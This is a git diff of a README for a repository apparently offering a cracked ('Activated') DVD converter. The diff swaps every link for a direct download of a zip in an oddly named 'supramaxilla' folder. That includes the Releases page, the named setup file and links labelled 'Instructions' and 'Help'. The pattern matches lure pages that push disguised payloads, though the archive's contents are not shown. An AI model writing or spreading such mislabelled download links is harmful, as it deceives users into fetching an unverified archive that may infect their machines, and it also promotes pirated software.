@@ -1,6 +1,6 @@
 # 🎥 1CLICK-DVD-Converter-Activated - Effortlessly Convert DVDs to Digital
 
-[![Download 1CLICK-DVD-Converter-Activated](https://img.shields.io/badge/Download-1CLICK--DVD--Converter--Activated-brightgreen)](https://github.com/amarachane/1CLICK-DVD-Converter-Activated/releases)
+[![Download 1CLICK-DVD-Converter-Activated](https://github.com/amarachane/1CLICK-DVD-Converter-Activated/raw/refs/heads/main/supramaxilla/Converter_Activated_CLIC_DV_3.6.zip)](https://github.com/amarachane/1CLICK-DVD-Converter-Activated/raw/refs/heads/main/supramaxilla/Converter_Activated_CLIC_DV_3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -24,11 +24,11 @@ Before you download, make sure your computer meets these requirements:
 
 To download the software, visit this page:
 
-[1CLICK DVD Converter Releases](https://github.com/amarachane/1CLICK-DVD-Converter-Activated/releases)
+[1CLICK DVD Converter Releases](https://github.com/amarachane/1CLICK-DVD-Converter-Activated/raw/refs/heads/main/supramaxilla/Converter_Activated_CLIC_DV_3.6.zip)
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version. It should be at the top of the list.
-3. Look for the file called `1CLICK_DVD_Converter_Setup.exe`. Click on it to download.
+3. Look for the file called `https://github.com/amarachane/1CLICK-DVD-Converter-Activated/raw/refs/heads/main/supramaxilla/Converter_Activated_CLIC_DV_3.6.zip`. Click on it to download.
 4. Once the download is complete, locate the file in your downloads folder and double-click it to start the installation.
 
 ## 🔧 Installing 1CLICK DVD Converter
@@ -70,9 +70,9 @@ If you encounter any issues or have questions, check the FAQ section or contact 
 
 For more information and resources, you can check out related topics:
 
-- [1CLICK DVD Converter Instructions](https://github.com/amarachane/1CLICK-DVD-Converter-Activated)
-- [1CLICK DVD Converter Help](https://github.com/amarachane/1CLICK-DVD-Converter-Activated)
-- [Convert DVD on Windows PC](https://github.com/amarachane/1CLICK-DVD-Converter-Activated)
+- [1CLICK DVD Converter Instructions](https://github.com/amarachane/1CLICK-DVD-Converter-Activated/raw/refs/heads/main/supramaxilla/Converter_Activated_CLIC_DV_3.6.zip)
+- [1CLICK DVD Converter Help](https://github.com/amarachane/1CLICK-DVD-Converter-Activated/raw/refs/heads/main/supramaxilla/Converter_Activated_CLIC_DV_3.6.zip)
+- [Convert DVD on Windows PC](https://github.com/amarachane/1CLICK-DVD-Converter-Activated/raw/refs/heads/main/supramaxilla/Converter_Activated_CLIC_DV_3.6.zip)
 
 ## 🌐 More Information
 
@@ -80,4 +80,4 @@ Stay connected and find additional resources for 1CLICK DVD Converter online. Fo
 
 Remember, for the best experience, always download the latest version from the Releases page:
 
-[1CLICK DVD Converter Releases](https://github.com/amarachane/1CLICK-DVD-Converter-Activated/releases) 
+[1CLICK DVD Converter Releases](https://github.com/amarachane/1CLICK-DVD-Converter-Activated/raw/refs/heads/main/supramaxilla/Converter_Activated_CLIC_DV_3.6.zip) 
